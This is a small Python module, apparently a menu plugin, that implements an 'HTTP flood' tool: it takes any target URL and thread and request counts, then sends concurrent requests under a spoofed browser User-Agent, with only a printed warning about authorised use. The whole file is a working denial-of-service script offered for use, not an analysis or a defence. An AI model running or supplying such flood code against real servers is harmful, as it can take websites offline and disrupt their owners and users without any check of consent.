import urllib.request
import threading
import color

DESCRIPTION = "HTTP Flood Stress Testing Tool"
GROUP_ID = 1  # Networking Tools
COLOR = color.BLUE

def send_http_requests(url: str, request_count: int):
    """Send rapid HTTP requests to stress test web servers."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    
    success = 0
    for _ in range(request_count):
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status < 500:
                    success += 1
        except Exception:
            pass

def run():
    print(color.color_text("--- HTTP Flood Stress Tool ---", COLOR))
    print(color.color_text("[!] Warning: Use only for authorized web server stress testing and educational purposes.\n", color.RED))
    
    url = input("Enter target URL (e.g., http://example.com): ").strip()
    if not url:
        print(color.color_text("[!] URL cannot be empty.", color.RED))
        return

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    try:
        count = int(input("Enter requests per thread (e.g., 50): ").strip() or "50")
        threads_num = int(input("Enter number of concurrent threads (e.g., 5): ").strip() or "5")
    except ValueError:
        print(color.color_text("[!] Invalid numeric input provided.", color.RED))
        return

    print(color.color_text(f"\n[+] Starting HTTP flood against {url} using {threads_num} threads...\n", color.GREEN))

    threads = []
    for _ in range(threads_num):
        t = threading.Thread(target=send_http_requests, args=(url, count))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(color.color_text(f"\n[+] HTTP stress testing session finished.", color.CYAN))
